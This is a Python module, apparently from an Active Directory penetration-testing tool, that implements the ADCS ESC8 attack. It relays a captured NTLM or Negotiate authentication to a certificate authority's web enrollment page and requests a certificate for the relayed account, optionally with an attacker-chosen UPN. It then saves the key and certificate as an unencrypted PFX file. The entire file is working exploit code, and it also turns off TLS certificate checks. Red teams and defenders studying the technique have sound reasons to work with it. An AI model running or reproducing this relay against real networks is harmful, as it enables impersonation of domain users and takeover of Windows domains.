"""Native ADCS ESC8 relay target."""

from __future__ import annotations

import asyncio
import base64
import os
import re
import ssl
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlencode

from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12
from cryptography.x509.oid import NameOID

from adscan_internal.services.adcs.esc_cleanup import format_certificate_not_after
from adscan_internal.services.relay.core import RelayAuthentication, RelayTargetResult
from adscan_internal.services.relay.display import print_relay_captured
from adscan_internal.services.relay.identity import (
    extract_ntlm_identity,
    format_principal,
)

_REQUEST_ID_RE = re.compile(r"certnew\.cer\?ReqID=([0-9]+)&", re.IGNORECASE)
_PENDING_ID_RE = re.compile(r"Your Request Id is ([0-9]+)", re.IGNORECASE)
_HTTP_USER_AGENT = "Mozilla/5.0 (compatible; ADscan Native ADCS Relay)"
_UPN_OID = "1.3.6.1.4.1.311.20.2.3"
_NTLM_MECH = "NTLMSSP - Microsoft NTLM Security Support Provider"


@dataclass(frozen=True)
class AdcsEsc8RelayConfig:
    """Target settings for relaying NTLM to ADCS Web Enrollment."""

    ca_host: str
    template: str
    output_dir: Path
    ca_fqdn: str | None = None
    scheme: str = "http"
    port: int | None = None
    alt_upn: str | None = None
    key_size: int = 2048
    timeout_seconds: float = 20.0


class AdcsEsc8RelayTarget:
    """Relay a captured NTLM context to ADCS Web Enrollment and request a cert."""

    name = "adcs-esc8-http"
    technique = "ADCSESC8"

    def __init__(self, config: AdcsEsc8RelayConfig) -> None:
        self.config = config

    async def run(self, authentication: RelayAuthentication) -> RelayTargetResult:
        """Use one relayed NTLM authentication to request an ADCS cert over HTTP."""

        client = _AdcsWebEnrollmentClient(self.config)
        try:
            await client.connect()
            await client.authenticate(authentication.gssapi)
            domain, username = extract_ntlm_identity(authentication.gssapi)
            domain = authentication.domain or domain
            username = authentication.username or username
            principal = format_principal(domain, username)
            common_name = principal or "relayed-principal"
            print_relay_captured(principal, self.config.ca_fqdn or self.config.ca_host, self.technique)

            key, csr_pem = _build_csr_pem(
                common_name=common_name,
                alt_upn=self.config.alt_upn,
                key_size=self.config.key_size,
            )
            attributes = [f"CertificateTemplate:{self.config.template}"]
            if self.config.alt_upn:
                attributes.append(f"SAN:upn={self.config.alt_upn}")
            request_id, cert_bytes = await client.request_certificate(
                csr_pem=csr_pem,
                attributes="\r\n".join(attributes),
            )
        finally:
            await client.close()

        if not cert_bytes:
            return RelayTargetResult(
                target_name=self.name,
                success=False,
                technique=self.technique,
                principal=principal,
                error=f"ADCS Web Enrollment did not return a certificate for request_id={request_id}",
                metadata={"request_id": request_id},
            )

        cert = _load_certificate(cert_bytes)
        self.config.output_dir.mkdir(parents=True, exist_ok=True)
        safe_name = _safe_filename(principal or common_name)
        pfx_path = (
            self.config.output_dir / f"{safe_name}_esc8_{os.urandom(4).hex()}.pfx"
        )
        pfx_bytes = pkcs12.serialize_key_and_certificates(
            name=(principal or common_name).encode(),
            key=key,
            cert=cert,
            cas=None,
            encryption_algorithm=NoEncryption(),
        )
        pfx_path.write_bytes(pfx_bytes)

        return RelayTargetResult(
            target_name=self.name,
            success=True,
            technique=self.technique,
            principal=principal,
            artifact_paths=(str(pfx_path),),
            metadata={
                "request_id": request_id,
                "cert_serial": f"{cert.serial_number:X}",
                "cert_subject": cert.subject.rfc4514_string(),
                "cert_not_after": format_certificate_not_after(cert),
                "template": self.config.template,
                "endpoint": client.endpoint,
            },
        )


class _AdcsWebEnrollmentClient:
    """Small async HTTP/1.1 client for connection-oriented NTLM relay to certsrv."""

    def __init__(self, config: AdcsEsc8RelayConfig) -> None:
        self.config = config
        self.host = config.ca_fqdn or config.ca_host
        self.port = config.port or (443 if config.scheme.lower() == "https" else 80)
        self.endpoint = (
            f"{config.scheme.lower()}://{self.host}:{self.port}/certsrv/certfnsh.asp"
        )
        self._reader: asyncio.StreamReader | None = None
        self._writer: asyncio.StreamWriter | None = None

    async def connect(self) -> None:
        """Open the target TCP connection used for the full NTLM-authenticated flow."""

        ssl_context = None
        if self.config.scheme.lower() == "https":
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        server_hostname = self.host if ssl_context is not None else None
        self._reader, self._writer = await asyncio.wait_for(
            asyncio.open_connection(
                self.config.ca_host,
                self.port,
                ssl=ssl_context,
                server_hostname=server_hostname,
            ),
            timeout=self.config.timeout_seconds,
        )

    async def close(self) -> None:
        """Close the target HTTP connection."""

        if self._writer is None:
            return
        self._writer.close()
        await self._writer.wait_closed()
        self._writer = None
        self._reader = None

    async def authenticate(self, gssapi) -> None:
        """Complete HTTP NTLM/Negotiate authentication using the relayed GSSAPI context."""

        initial = await self._request("GET", "/certsrv/certfnsh.asp")
        auth_method = _select_auth_method(initial.headers.get("www-authenticate", ""))
        if auth_method == "Negotiate":
            token, cont, err = await gssapi.authenticate(None)
            if err is not None:
                raise err
            if not token or not cont:
                raise RuntimeError("SPNEGO relay did not produce an initial token")
            challenge_response = await self._request(
                "GET",
                "/certsrv/certfnsh.asp",
                headers={
                    "Authorization": f"Negotiate {base64.b64encode(token).decode()}"
                },
            )
            challenge = _extract_auth_token(
                challenge_response.headers.get("www-authenticate", ""), "Negotiate"
            )
            token, _cont, err = await gssapi.authenticate(challenge)
        else:
            ntlm_context = getattr(gssapi, "authentication_contexts", {}).get(
                _NTLM_MECH
            )
            if ntlm_context is None:
                raise RuntimeError(
                    "Relayed SPNEGO context does not expose an NTLM relay handler"
                )
            token, cont, err = await ntlm_context.authenticate(None)
            if err is not None:
                raise err
            if not token or not cont:
                raise RuntimeError("NTLM relay did not produce an initial token")
            challenge_response = await self._request(
                "GET",
                "/certsrv/certfnsh.asp",
                headers={"Authorization": f"NTLM {base64.b64encode(token).decode()}"},
            )
            challenge = _extract_auth_token(
                challenge_response.headers.get("www-authenticate", ""), "NTLM"
            )
            token, _cont, err = await ntlm_context.authenticate(challenge)

        if err is not None:
            raise err
        if not token:
            raise RuntimeError("Relay did not produce a final authenticate token")
        final = await self._request(
            "GET",
            "/certsrv/certfnsh.asp",
            headers={
                "Authorization": f"{auth_method} {base64.b64encode(token).decode()}"
            },
        )
        if final.status == 401:
            raise RuntimeError(
                "ADCS Web Enrollment rejected relayed NTLM authentication"
            )

    async def request_certificate(
        self, *, csr_pem: str, attributes: str
    ) -> tuple[int | None, bytes | None]:
        """Submit the web enrollment form and retrieve the issued certificate."""

        form = urlencode(
            {
                "Mode": "newreq",
                "CertRequest": csr_pem,
                "CertAttrib": attributes,
                "TargetStoreFlags": "0",
                "SaveCert": "yes",
                "ThumbPrint": "",
            }
        ).encode()
        response = await self._request(
            "POST",
            "/certsrv/certfnsh.asp",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=form,
        )
        text = response.body.decode("utf-8", errors="replace")
        request_id = _extract_request_id(text)
        if response.status != 200 or request_id is None:
            raise RuntimeError(_summarize_adcs_response(text, response.status))

        cert_response = await self._request(
            "GET", f"/certsrv/certnew.cer?ReqID={request_id}"
        )
        if cert_response.status != 200:
            raise RuntimeError(
                f"certificate retrieval failed with HTTP {cert_response.status}"
            )
        return request_id, cert_response.body

    async def _request(
        self,
        method: str,
        path: str,
        *,
        headers: dict[str, str] | None = None,
        body: bytes = b"",
    ) -> "_HttpResponse":
        if self._reader is None or self._writer is None:
            raise RuntimeError("HTTP client is not connected")
        request_headers = {
            "Host": self.host,
            "User-Agent": _HTTP_USER_AGENT,
            "Connection": "keep-alive",
            "Content-Length": str(len(body)),
        }
        request_headers.update(headers or {})
        raw = f"{method} {path} HTTP/1.1\r\n".encode()
        raw += b"".join(
            f"{name}: {value}\r\n".encode() for name, value in request_headers.items()
        )
        raw += b"\r\n" + body
        self._writer.write(raw)
        await asyncio.wait_for(
            self._writer.drain(), timeout=self.config.timeout_seconds
        )
        return await _read_http_response(self._reader, self.config.timeout_seconds)


@dataclass(frozen=True)
class _HttpResponse:
    status: int
    headers: dict[str, str]
    body: bytes


async def _read_http_response(
    reader: asyncio.StreamReader, timeout_seconds: float
) -> _HttpResponse:
    header_bytes = await asyncio.wait_for(
        reader.readuntil(b"\r\n\r\n"), timeout=timeout_seconds
    )
    header_text = header_bytes.decode("iso-8859-1", errors="replace")
    lines = header_text.split("\r\n")
    status = int(lines[0].split(" ", 2)[1])
    headers: dict[str, str] = {}
    for line in lines[1:]:
        if not line or ":" not in line:
            continue
        name, value = line.split(":", 1)
        key = name.strip().lower()
        value = value.strip()
        headers[key] = f"{headers[key]}, {value}" if key in headers else value
    body = await _read_response_body(reader, headers, timeout_seconds)
    return _HttpResponse(status=status, headers=headers, body=body)


async def _read_response_body(
    reader: asyncio.StreamReader, headers: dict[str, str], timeout_seconds: float
) -> bytes:
    if headers.get("transfer-encoding", "").lower() == "chunked":
        chunks: list[bytes] = []
        while True:
            size_line = await asyncio.wait_for(
                reader.readline(), timeout=timeout_seconds
            )
            size = int(size_line.split(b";", 1)[0], 16)
            if size == 0:
                await asyncio.wait_for(
                    reader.readuntil(b"\r\n"), timeout=timeout_seconds
                )
                return b"".join(chunks)
            chunks.append(
                await asyncio.wait_for(
                    reader.readexactly(size), timeout=timeout_seconds
                )
            )
            await asyncio.wait_for(reader.readexactly(2), timeout=timeout_seconds)
    length = int(headers.get("content-length", "0") or "0")
    if length == 0:
        return b""
    return await asyncio.wait_for(reader.readexactly(length), timeout=timeout_seconds)


def _select_auth_method(header: str) -> str:
    lowered = header.lower()
    if "negotiate" in lowered:
        return "Negotiate"
    if "ntlm" in lowered:
        return "NTLM"
    # Distinguish the two failure modes so the operator gets an actionable
    # signal. An empty WWW-Authenticate (or no header at all) on the certsrv
    # endpoint means we did not reach an authenticating certsrv handler — the
    # scheme/port is wrong, the endpoint redirected (e.g. HTTP→HTTPS), or this
    # is not certsrv. A non-empty header that simply lacks NTLM/Negotiate means
    # the CA actively refused those schemes (only Basic/other offered).
    if not header.strip():
        raise RuntimeError(
            "ADCS Web Enrollment returned no WWW-Authenticate header — the "
            "endpoint is not an authenticating certsrv handler (wrong "
            "scheme/port or an SSL/redirect in front). Re-check the CA scheme."
        )
    raise RuntimeError(
        f"ADCS Web Enrollment refused NTLM/Negotiate (offered: {header!r})"
    )


def _extract_auth_token(header: str, method: str) -> bytes:
    pattern = re.compile(
        rf"{re.escape(method)}\s+([A-Za-z0-9+/]+={{0,2}})", re.IGNORECASE
    )
    match = pattern.search(header)
    if match is None:
        raise RuntimeError(f"ADCS Web Enrollment did not return a {method} challenge")
    return base64.b64decode(match.group(1))


def _extract_request_id(content: str) -> int | None:
    match = _REQUEST_ID_RE.search(content) or _PENDING_ID_RE.search(content)
    return int(match.group(1)) if match else None


def _summarize_adcs_response(content: str, status: int) -> str:
    if "template that is not supported" in content:
        return f"ADCS Web Enrollment rejected the template (HTTP {status})"
    if "Certificate Pending" in content:
        return (
            f"ADCS Web Enrollment placed the request in pending state (HTTP {status})"
        )
    code_match = re.search(r"(0x[0-9a-fA-F]+)", content)
    if code_match:
        return f"ADCS Web Enrollment failed with {code_match.group(1)} (HTTP {status})"
    return f"ADCS Web Enrollment did not issue a certificate (HTTP {status})"


def _build_csr_pem(
    *, common_name: str, alt_upn: str | None, key_size: int
) -> tuple[rsa.RSAPrivateKey, str]:
    key = rsa.generate_private_key(public_exponent=0x10001, key_size=key_size)
    builder = x509.CertificateSigningRequestBuilder().subject_name(
        x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])
    )
    if alt_upn:
        from asn1crypto import core as asn1core

        builder = builder.add_extension(
            x509.SubjectAlternativeName(
                [
                    x509.OtherName(
                        x509.ObjectIdentifier(_UPN_OID),
                        asn1core.UTF8String(alt_upn).dump(),
                    )
                ]
            ),
            critical=False,
        )
    csr = builder.sign(key, hashes.SHA256())
    return key, csr.public_bytes(Encoding.PEM).decode()


def _load_certificate(data: bytes) -> x509.Certificate:
    if b"BEGIN CERTIFICATE" in data:
        return x509.load_pem_x509_certificate(data)
    return x509.load_der_x509_certificate(data)


def _safe_filename(value: str) -> str:
    cleaned = "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in value)
    return cleaned.strip("._") or "relayed-principal"
